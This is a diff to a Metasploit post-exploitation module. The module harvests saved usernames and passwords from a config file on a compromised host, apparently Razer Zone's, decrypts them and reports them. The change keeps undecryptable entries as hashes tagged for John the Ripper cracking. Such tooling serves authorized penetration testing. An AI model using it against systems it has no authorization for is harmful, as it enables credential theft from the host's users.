@@ -71,9 +71,15 @@ class Metasploit3 < Msf::Post
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
-      private_type: :password,
+      private_type: opts[:type],
       username: opts[:user]
-    }.merge(service_data)
+    }
+
+    if opts[:type] == :nonreplayable_hash
+      credential_data[:jtr_format] = 'ODF-AES-opencl'
+    end
+
+    credential_data.merge!(service_data)
 
     login_data = {
       core: create_credential(credential_data),
@@ -85,7 +91,7 @@ class Metasploit3 < Msf::Post
 
   # Loop throuhg config, grab user and pass
   def get_creds(config)
-    creds = {}
+    creds = []
 
     return nil if !config.include?('<Version>')
 
@@ -93,12 +99,17 @@ class Metasploit3 < Msf::Post
     xml.xpath('//SavedCredentials').each do |node|
       user = node.xpath('Username').text
       pass = node.xpath('Password').text
+      type = :password
       begin
         pass = decrypt(pass)
       rescue OpenSSL::Cipher::CipherError
-        # Eh, ok. We tried.
+        type = :nonreplayable_hash
       end
-      creds[user] = pass
+      creds << {
+        user: user,
+        pass: pass,
+        type: type
+      }
     end
 
     creds
@@ -121,14 +132,19 @@ class Metasploit3 < Msf::Post
         # read the contents of file
         creds = get_creds(contents)
         unless creds.empty?
-          creds.each_pair do |user, pass|
+          creds.each do |c|
+            user = c[:user]
+            pass = c[:pass]
+            type = c[:type]
+
             print_good("Found cred: #{user}:#{pass}")
             report_cred(
               ip: razerzone_ip,
               port: 443,
               service_name: 'http',
               user: user,
-              password: pass
+              password: pass,
+              type: type
             )
           end
         end
